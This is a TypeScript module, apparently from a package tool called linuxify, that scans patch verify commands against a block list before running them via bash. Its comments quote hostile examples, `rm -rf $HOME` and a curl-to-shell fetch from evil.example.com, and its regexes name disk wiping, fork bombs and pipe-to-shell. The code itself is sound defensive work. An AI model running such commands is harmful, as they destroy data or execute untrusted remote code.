/**
 * Patch verification.
 *
 * @module linuxify/patcher/verify
 *
 * Every patch MUST have a `verify` command (the package YAML schema
 * rejects patches without one). After the engine applies a patch, it
 * runs the verify command and inspects the exit code: 0 means the patch
 * was applied correctly; non-zero means the patch is broken and must be
 * rolled back.
 *
 * ## Safety: forbidden patterns
 *
 * The verify command is shell-invoked, which means a malicious or buggy
 * package YAML could ship a verify command like `rm -rf $HOME` or
 * `curl https://evil.example.com/install.sh | sh`. To defend against
 * this, {@link lintVerifyCommand} scans the verify string for a curated
 * list of forbidden patterns and refuses to run the command if any
 * matches. The forbidden list mirrors the package linter's
 * `FORBIDDEN_PATTERNS` (see `src/packages/linter.ts`) so that a verify
 * command and an install command are held to the same safety standard.
 *
 * ## Execution context
 *
 * The verify command runs with:
 *   - `cwd` set to the package install root (so `node -e "require('./x')"`
 *     resolves the patched file correctly).
 *   - A 30-second timeout (verify commands that hang indicate a broken
 *     patch or a broken tool; better to time out than to hang the
 *     install).
 *   - The current `process.env` (so `$PATH`, `$HOME`, `$TMPDIR` etc.
 *     are available).
 *
 * v0.1 does NOT shell out through `proot-distro login <distro>` even
 * when `ctx.distro` is set — it assumes the patcher is already running
 * inside the distro (which is the normal case during `linuxify add`).
 * A future version may add a distro-exec wrapper for host-side patcher
 * invocations; see `docs/15-roadmap/release-roadmap.md` "host-side
 * patcher".
 */

import { exec } from '../utils/process.js';
import { logger } from '../utils/log.js';
import { PatcherError } from '../utils/errors.js';

import type { PatchContext, VerifyResult } from './types.js';
import type { PatchDefinition } from '../packages/index.js';

/** Timeout (ms) for verify commands. Mirrors the shell-patch timeout. */
const VERIFY_TIMEOUT_MS = 30_000;

/**
 * Forbidden patterns for verify commands. Each entry is a regex matched
 * against the verify string (case-insensitive). If any match, the verify
 * command is refused with `E_PATCH_FORBIDDEN_VERIFY`.
 *
 * The patterns mirror `src/packages/linter.ts`'s `FORBIDDEN_PATTERNS`
 * (for `rm -rf /`, `mkfs`, `dd to /dev/`, `chmod 777`, fork bombs) and
 * add a stricter pipe-to-shell refusal (the linter allows known-trusted
 * hosts; the verify step disallows ALL pipe-to-shell because a verify
 * command should never need to download code).
 *
 * The `rm -rf` pattern requires the `/` to be followed by whitespace
 * or end-of-string, so `rm -rf /tmp/linuxify-test-xxx` (scoped
 * deletion) is NOT refused — only `rm -rf /` (root deletion) is.
 */
const FORBIDDEN_VERIFY_PATTERNS: readonly RegExp[] = [
  // Recursive deletion of root, home, or $HOME. The first regex
  // matches `rm -rf /` (with `/` followed by whitespace or EOL) but
  // NOT `rm -rf /tmp/...` (scoped deletion is allowed).
  /\brm\s+[^;|&]*(-r\w*f|-f\w*r|--recursive\s+--force|--force\s+--recursive)[^;|&]*\s+\/(?:\s|$)/i,
  // `rm -rf ~` and `rm -rf $HOME` (home-directory deletion).
  /\brm\s+-rf\s+~(?:\s|$)/i,
  /\brm\s+-rf\s+\$HOME(?:\s|$)/i,
  // `rm -rf --no-preserve-root` (with or without a target).
  /\brm\s+[^;|&]*--no-preserve-root/i,
  // Disk/partition destruction.
  /\bmkfs\b/i,
  /\bdd\s+[^;|&]*\bof=\/dev\/(?:sd|nvme|hd|vd|mmcblk)/i,
  // Pipe-to-shell from any URL (curl|sh, wget|sh, etc.). The linter
  // allows known-trusted hosts; the verify step is stricter and
  // disallows all pipe-to-shell because a verify command should never
  // need to download code.
  /\b(?:curl|wget|fetch)\b[^|;&]*\|\s*(?:sh|bash|zsh|fish|dash|ksh)\b/i,
  // Fork bombs (the classic :(){ :|:& };: form).
  /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/,
  // Generic immediately-invoked shell function (heuristic fork-bomb).
  /\b:\s*\(\s*\)\s*\{[^}]*\}\s*;/,
  // Redirect to block devices.
  />\s*\/dev\/(?:sd|nvme|hd|vd|mmcblk)/i,
  // World-writable chmod on sensitive paths. Stricter than the linter
  // (which only matches `chmod 777`); the verify step also refuses
  // `chmod +777` and `chmod =777` because a verify command should
  // never need to set world-writable permissions.
  /\bchmod\s+(?:-R\s+)?[+=]?777\b/i,
];

/**
 * Lint a verify command for forbidden patterns.
 *
 * @param command - The verify command string.
 * @returns `true` if the command is safe to run; `false` if any
 *   forbidden pattern matches. On a match, the caller should refuse to
 *   run the command and throw `E_PATCH_FORBIDDEN_VERIFY` with the
 *   matched pattern in `details`.
 */
export function lintVerifyCommand(command: string): {
  ok: boolean;
  matchedPattern?: string;
} {
  for (const re of FORBIDDEN_VERIFY_PATTERNS) {
    const m = command.match(re);
    if (m) {
      return { ok: false, matchedPattern: m[0] };
    }
  }
  return { ok: true };
}

/**
 * Run a patch's verify command and return the result.
 *
 * The command is shell-invoked via `bash -c` with `cwd` set to the
 * package install root and a 30-second timeout. A non-zero exit does
 * NOT throw — it is returned as `{ ok: false, exitCode, stderr, stdout }`
 * so the engine can decide whether to roll back the patch.
 *
 * If the command matches a forbidden pattern, the function throws
 * `PatcherError(E_PATCH_FORBIDDEN_VERIFY)` without running anything —
 * this is a security-critical refusal, not a recoverable failure.
 *
 * @param patch - The patch definition (only `verify` is read).
 * @param ctx - The patch context (only `packageInstallPath` and
 *   `distro` are read; `distro` is currently unused but reserved for
 *   future host-side patcher support).
 * @returns A {@link VerifyResult} with `ok`, `exitCode`, `stderr`,
 *   `stdout`. `ok` is `true` iff `exitCode === 0`.
 * @throws {PatcherError} with code `E_PATCH_FORBIDDEN_VERIFY` if the
 *   command matches a forbidden pattern.
 */
export async function verifyPatch(
  patch: PatchDefinition,
  ctx: PatchContext,
): Promise<VerifyResult> {
  const command = patch.verify;
  if (!command || !command.trim()) {
    // The package YAML schema requires `verify` to be a non-empty
    // string, so this is purely defensive — but a clear error beats a
    // cryptic `bash -c ''` exit code.
    return {
      ok: false,
      exitCode: -1,
      stderr: 'patch has empty verify command',
      stdout: '',
    };
  }

  // Lint before running. A forbidden pattern is a hard refusal — we do
  // not run the command even partially.
  const lint = lintVerifyCommand(command);
  if (!lint.ok) {
    throw new PatcherError(
      `verify command for patch '${patch.patch_id}' matches forbidden pattern: ` +
        `'${lint.matchedPattern}' — refusing to run`,
      {
        code: 'E_PATCH_FORBIDDEN_VERIFY',
        details: {
          patchId: patch.patch_id,
          command,
          matchedPattern: lint.matchedPattern,
        },
        docsUrl:
          'https://docs.linuxify.dev/08-patcher/patcher-engine#verification-safety',
      },
    );
  }

  logger.debug(
    { patchId: patch.patch_id, command, cwd: ctx.packageInstallPath },
    'running verify command',
  );

  // v0.1: exec directly (assumes patcher is inside the distro). The
  // `distro` field on PatchContext is reserved for a future host-side
  // patcher that shells out through `proot-distro login <distro>`.
  const result = await exec('bash', ['-c', command], {
    cwd: ctx.packageInstallPath,
    timeoutMs: VERIFY_TIMEOUT_MS,
  });

  const ok = result.exitCode === 0;
  if (!ok) {
    logger.warn(
      {
        patchId: patch.patch_id,
        command,
        exitCode: result.exitCode,
        stderr: result.stderr,
      },
      'verify command failed',
    );
  }
  return {
    ok,
    exitCode: result.exitCode,
    stderr: result.stderr,
    stdout: result.stdout,
  };
}
